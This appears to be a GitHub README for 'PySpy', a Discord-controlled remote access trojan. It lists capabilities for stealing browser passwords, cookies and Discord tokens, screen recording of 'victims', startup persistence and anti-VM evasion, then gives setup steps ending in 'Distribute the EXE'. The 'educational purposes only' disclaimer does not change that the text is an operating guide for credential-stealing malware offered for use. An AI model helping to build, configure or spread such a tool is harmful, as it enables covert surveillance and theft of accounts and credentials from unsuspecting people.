# PySpy
PySpy is an open-source Discord RAT (Remote Access Tool) that can be controlled via your Discord server. This tool is for educational purposes and personal experimentation only.
## Disclaimer
This project is intended for educational purposes only. The author is not responsible for any misuse of this software.
## Features
- Multiple computers at once
- Grabs computer details
- Grabs browser passwords
- Grabs browser cookies
- Grabs Discord account info
- Startup persistance
- Anti-VM (Optional)
## Commands
- !help - Sends the help embed
- !screenshot - Takes a screenshot
- !type \<phrase\> - Types the selected phrase
- !screenrecord \<length\> - Records victums screen for selected time
- !passwords - Returns saved browser passwords
- !exit - Closes the current session and exits the exe
- !message \<title\> \<message\> - Shows a message box with the selected arguments
- !discord - Sends Discord account info and token
- !cookies - Sends browser cookies
## Setup
1. Clone the repository
   ```
   git clone https://github.com/LunarrBlue/PySpy.git
   cd PySpy
2. Configure `config.json`
   - "token" -> Your Discord bots token
   - "app_name" -> Name of the EXE
   - "app_logo" -> Path to EXE logo
   - "members" -> Mimimum members in a Discord server to be shown by `!discord`
   - "anti-vm" -> Defines if anti-vm should be enabled
3. Run `build.bat` and wait
4. Distribute the EXE located in `dist`
---
If you would like to rebuild the EXE for any reason, run `rebuild.bat` then follow the steps above.
